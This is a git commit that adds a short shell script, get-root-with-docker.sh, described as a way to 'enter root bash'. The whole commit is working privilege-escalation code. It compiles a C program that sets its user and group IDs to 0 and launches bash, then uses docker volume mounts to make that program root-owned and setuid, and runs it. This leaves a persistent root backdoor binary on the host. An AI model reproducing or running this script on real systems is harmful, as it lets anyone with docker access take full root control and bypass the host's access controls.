6271a1b3d7abd0dddfeb4e03175b9da373e7aa5b
Schspa Shi <schspa@gmail.com>
2023-06-06 15:38:07 +0800

    script: add script to enter root bash
    Signed-off-by: Schspa Shi <schspa@gmail.com>

---
+++ get-root-with-docker.sh
@@ -0,0 +1,34 @@
+#!/usr/bin/env bash
+
+gcc -o ./enter_root_bash -x c - <<ENDOFMESSAGE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[])
+{
+
+    (void) argc;
+    (void) argv;
+
+    printf("real uid\t %d\n",getuid());
+    printf("effective uid\t %d\n",geteuid());
+    if(setuid(0) == -1)
+    {
+        perror("setuid(0) failed");
+        return -1;
+    }
+    if(setgid(0) == -1)
+    {
+        perror("setgid(0) failed");
+        return -1;
+    }
+
+    return system("bash");
+}
+ENDOFMESSAGE
+
+docker run --rm -v $(pwd):/work ubuntu chown root:root /work/enter_root_bash
+docker run --rm -v $(pwd):/work ubuntu chmod u+s /work/enter_root_bash
+
+./enter_root_bash
